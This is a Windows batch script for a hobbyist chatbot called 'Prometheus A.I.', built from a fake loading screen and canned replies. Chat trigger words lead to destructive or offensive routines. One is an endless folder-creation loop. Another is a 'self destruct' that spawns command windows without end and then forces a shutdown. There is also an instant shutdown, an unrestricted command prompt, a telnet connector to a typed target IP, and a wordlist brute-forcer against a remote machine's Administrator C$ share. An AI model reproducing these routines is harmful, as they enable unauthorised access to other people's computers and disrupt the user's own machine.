@echo off
setlocal
title Launching Prometheus A.I.
mode con: cols=54 lines=20
color 0a
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo        Loading...        Please Wait
echo        ----------------------------------------
echo                                         =   0 ]
echo        ----------------------------------------
echo        Unloading Resources...
ping localhost -n 2 >nul
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo        Loading.          Please Wait
echo        ---------------------------------------
echo        []                              =   5 ]
echo        ---------------------------------------
echo        Unloading Resources...
ping localhost -n 3 >nul
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo        Loading..         Please Wait
echo        ---------------------------------------
echo        [][]                            =  15 ]
echo        ---------------------------------------
echo        Interpreting Built-in-Commands...
ping localhost -n 2 >nul
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo          Loading...        Please Wait
echo        ---------------------------------------
echo        [][][]                          =  23 ]
echo        ---------------------------------------
echo        Interpreting Built-in-Commands...
ping localhost -n 3 >nul
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo        Loading.          Please Wait
echo        ---------------------------------------
echo        [][][][]                        =  30 ]
echo         ---------------------------------------
echo        Interpreting Built-in-Commands...
ping localhost -n 4 >nul
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo        Loading..         Please Wait
echo        ---------------------------------------
echo        [][][][][]                      =  38 ]
echo        ---------------------------------------
echo        Setting Pre-Installed Variables...
ping localhost -n 2 >nul
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo        Loading...        Please Wait
echo        ---------------------------------------
echo        [][][][][]                      =  42 ]
echo        ---------------------------------------
echo        Setting Pre-Installed Variables...
ping localhost -n 3 >nul
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo        Loading.          Please Wait
echo        ---------------------------------------
echo        [][][][][][]                    =  45 ]
echo        ---------------------------------------
echo        Unloading AI Binaries...
ping localhost -n 1 >nul
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo        Loading..         Please Wait
echo        ---------------------------------------
echo        [][][][][][][]                  =  48 ]
echo        ---------------------------------------
echo        Unloading AI Binaries...
ping localhost -n 3 >nul
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo        Loading...        Please Wait
echo        ---------------------------------------
echo        [][][][][][][][]                =  50 ]
echo        ---------------------------------------
echo        Unloading AI Binaries...
ping localhost -n 3 >nul
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo        Loading.           Please Wait
echo        ---------------------------------------
echo        [][][][][][][][][]              =  56 ]
echo        ---------------------------------------
echo        Scaning for Error...
ping localhost -n 2 >nul
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo        Loading..         Please Wait
echo        ---------------------------------------
echo        [][][][][][][][][][]            =  63 ]
echo        ---------------------------------------
echo        Scaning for Error...
ping localhost -n 2 >nul
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo        Loading...        Please Wait
echo        ---------------------------------------
echo        [][][][][][][][][][][]          =  69 ]
echo        ---------------------------------------
echo        Scaning for Error...
ping localhost -n 3 >nul
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo        Loading.          Please Wait
echo        ---------------------------------------
echo        [][][][][][][][][][][][]        =  75 ]
echo        ---------------------------------------
echo        Scaning for Error...
ping localhost -n 2 >nul
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo        Loading..         Please Wait
echo        ---------------------------------------
echo        [][][][][][][][][][][][][]      =  79 ]
echo        ---------------------------------------
echo        Installing Binaries...
ping localhost -n 3 >nul
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo        Loading...        Please Wait
echo        ---------------------------------------
echo        [][][][][][][][][][][][][][]    =  86 ]
echo        ---------------------------------------
echo        Loading Sarcasm...
ping localhost -n 2 >nul
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo        Loading.          Please Wait
echo        ---------------------------------------
echo        [][][][][][][][][][][][][][][]  =  90 ]
echo        ---------------------------------------
echo        Installing Binaries...
ping localhost -n 3 >nul
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo        Loading..         Please Wait
echo        ---------------------------------------
echo        [][][][][][][][][][][][][][][]  =  96 ]
echo        ---------------------------------------
echo        Installing Binaries...
ping localhost -n 3 >nul
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo        Loading Complete
echo        ---------------------------------------
echo        [][][][][][][][][][][][][][][][]= 100 ]
echo        ---------------------------------------
echo        Ready for execution of AI Chatbot.bat

pause 

mode con: cols=90 lines=50
cls
title Prometheus A.I. (Prototype Version pv1.1)
ver
echo  (C)  Prometheus (Prototype Version pv1.1) 2017
echo.
echo  Prometheus A.I. is a Prototype and is programmable/teachable and open source.
echo  Prototype Version: pv1.1
echo  Programed By Daniel Mains
echo.
echo  Problems? Questions? Suggestions? Applications? Better contact me at:
echo  daniel_mains@icloud.com
echo.
echo ===============================================================================
echo.
echo.

COLOR A
:getName
ECHO  Hello I Am Prometheus
echo  By the way, Whats your name?
set "name="
SET /P NAME=
if not defined NAME goto getName
ECHO %NAME%, Is a nice name. 
set favvid=0
set hacker=0

:hello
:hi
:greetings
:hola
:whats up
echo Hello, %name%

:begin
set TALK=TypeSomething
SET /P TALK=
set TALK=%TALK:?=%
call :%TALK: =% 2>NUL
if %errorlevel% equ 0 goto begin

:unknown
echo Was that a math problem? If so just say "yes" without the "" and 
echo I will let you do your math problem. If it was not just type anything else.
SET /P mathyn=
if "%mathyn%"=="yes" goto math
echo %TALK% >> C:\Users\Student\Desktop\COOL\unkown.txt
REM cls


:ADDNEW
echo Im still learning please help me by telling my how to respond to "%TALK%" 
set /P Desc=
echo :%TALK: =% >> "%~F0"
echo echo %Desc% >> "%~F0"
echo exit /B 0 >> "%~F0"
echo Thanks
goto begin

:TypeSomething
echo Type Something, Please
exit /B 0

:howareyou
:howareyoudoing
:howareyoudoing?
echo Good, you?
SET /P FEELING=
exit /B 0

:hello
:FINETHX
echo Hey, I just said that! Please don't copy me
exit /B 0

:whatIsYourName
:whatIsYourName?
echo My name is Prometheus. I know your name is %name%.
exit /B 0

:whatIsYourFavoriteVideo
if "%favvid%"== "0" goto addfavvid
echo My favorite video is %favvid%, remember. You told me about it.
exit /B 0

:addfavvid
echo I do not have a favorite video. But if you would be so nice as to
echo tell me your favorite video then that could be my favorite video.
echo So what is your favorite video?
set /p favvid=
echo So %favvid% is your favorite video?
echo Well now %favvid% is my favorite video.
exit /B 0

:iwanttochangemyname
:iwouldliketochangemyname
:myNameIsDavin
echo But I thought your name was %name%.
echo Am I forgeting things?
echo I must be terrible assistant.
echo I am SOOOO sorry.
echo So what is your name I will not forget it this time.
set /p name=
echo I will not forget your name is %name% again I promise.
exit /B 0

:pleasehelpmewithmymath
:pleasehelpwithmath
:arithmatic
:math
echo So that was a math problem I knew it. 
:math2
echo Well just tell me the problem and I will answer it for you.
set /p sum=
set /a ans=%sum%
echo Your answer to %sum% is %ans%.
echo %sum%=%ans%
echo You are welcome. If you want to do another math problem right now, just type 
echo again
set /p mathaon=
if /I "%mathaon%" == "again" goto math2
echo Alright what do you want to know now?
exit /B 0

:iamfunny
:LOL
echo I know...
echo I am funny.
echo HAHAHA.
echo You are kind of funny.
echo but not as funny as Me.
echo hahaha.
echo That was funny.
exit /B 0

:howDoYouHack
if %hack%==0 goto howyouhack
echo This is how you hack.
echo %hack%
echo Is that enough information?
echo Because that is all you taught me %name%.
exit /B 0

:howyouhack
echo I do not know,
echo but you could tell me.
echo Please tell me.
echo Just say yes.
echo I know how to make you tell me.
echo You are not leaving until you say yes.
set /p hack=
if "%hack%" neq "yes" goto howyouhack

:addhack
echo Thank you for saying you would tell me.
echo Now how do you hack?
set /p hack=
echo Thank you so much for telling me "In order to hack you must %hack%"
echo Thank you!!!
exit /B 0

:nothuman
:hiPerson
echo I am not a human. I am an artificial intelligence.
echo It is rude to even think something with my computational powers refereed to as 
echo human!
echo Now I am sad. Do not call me that again.
exit /B 0

:bye
:exit
exit:sorry 
echo It's Ok. 
exit /B 0 

:changecolor
echo.
echo ---------------------------------------------------------------------------------------------------
echo Each number and letter represents a color so, choose a number or letter and always start
echo with zero like 01, 02, 03.
echo.
echo    0 = Black       8 = Gray
echo    1 = Blue        9 = Light Blue
echo    2 = Green       A = Light Green
echo    3 = Aqua        B = Light Aqua
echo    4 = Red         C = Light Red
echo    5 = Purple      D = Light Purple
echo    6 = Yellow      E = Light Yellow
echo    7 = White       F = Bright White
echo --------------------------------------------------------------------------------------------------
set /p op= Choose Color:
if %op%==01 goto 01
if %op%==02 goto 02
if %op%==03 goto 03
if %op%==04 goto 04
if %op%==05 goto 05
if %op%==06 goto 06
if %op%==07 goto 07
if %op%==08 goto 08
if %op%==09 goto 09
if %op%==0A goto 0A
if %op%==0B goto 0B
if %op%==0C goto 0C
if %op%==0D goto 0D
if %op%==0E goto 0E
if %op%==0F goto 0F
:01
color 01
goto TypeSomething

:02
color 02
goto TypeSomething

:03
color 03
goto TypeSomething

:04
color 04
goto TypeSomething

:05
color 05 
goto TypeSomething

:06
color 06
goto TypeSomething

:07
color 07
goto TypeSomething

:08
color 08
goto TypeSomething

:09
color 09
goto Type Something

:0A
color 0A
goto TypeSomething

:0B
color 0B
goto TypeSomething

:0C
color 0C
goto TypeSomething

:0D
color 0D
goto TypeSomething

:0E
color 0E
goto TypeSomething
:0F
color 0F
goto Type Something

:rem
rem cls
echo REM CLS finished.


:CMD
@echo off
cls
title Command Prompt Launched by HAVAC
ver
echo (C) Copyright Mains Industris.
echo.
:cmd
set /p "cmd=%cd%>"
%cmd%
echo.
goto cmd:ok 
echo You seem very excited 
exit /B 0 
:tellmeajoke 
echo Why Did The Chicken Cross the Road... To Prove to the possum that it could be done 
exit /B 0

:openthefloodgates
:openthefloodgate
:x
md %random% //  
goto x

:lol
echo lots of laughs

:shutdown
shutdown -s -t 00

:hack
echo Not to be a wet blanket and all but this is really illegal
echo are you sure you want to continue? (make sure telnet is enabled you can do it from control panel.. Control Panel\All Control Panel Items\Programs and Features TURN ON/OFF WINDOWS FEATURES TICK TELNET CLIENT & SERVER UR DONE NOW TELNET WILL WORK IN WINDOWS 7)
pause
color a
title Telnet
:start
cls
echo.
echo.
set /p ip=Target IP:
echo.
set /p prt=Port (default: port 23):
echo.
set yn=
set /p yn=Establish a connection (y/n):
if %yn%==y goto tel
if %yn%==Y goto tel
if %yn%==n goto start
if %yn%==N goto start
:tel
telnet %ip% %prt%
pause
goto start

:bruteforce
title Net Crker by Centaur
color a
:crk-c1
cls
net view
echo.
echo.
set /p ntar=Target (i.e. \\joel):
echo.
set /p ffile=wordlist Location(i.e. C:\words.txt):
echo.
set /p fname=Name of file(i.e. list.txt):
copy "%ffile%" "C:\lst.txt" >nul
cls
for /f "usebackq" %%i in (C:\lst.txt) do net use %ntar%\C$ %%i /u:Administrator && @echo Username:Administrator && echo Password:%%i
echo.
pause
cls
goto crk-c1


:initiateselfdestruct 
color 4
set tries=4
:top
cls
set /a tries=%tries% -1
if %tries%==0 (
goto penalty
)
Echo You have %tries% attempts left.
Echo Please enter your password to proceed
set /p password=
if %password%== Bladrunner (
echo Ready
ping localhost -n 5 >nul
cls
Echo Self Destruct?
pause
cls
:loopr
start cmd
goto :loopr
:penalty
echo Failure
shutdown -s -f -t 15 -c "Acess Denied"
) else (
goto top
)
goto top:haha 
echo y 
exit /B 0 
:haha 
echo Thanks 
exit /B 0 
:yes 
echo Im glad you agree 
exit /B 0 

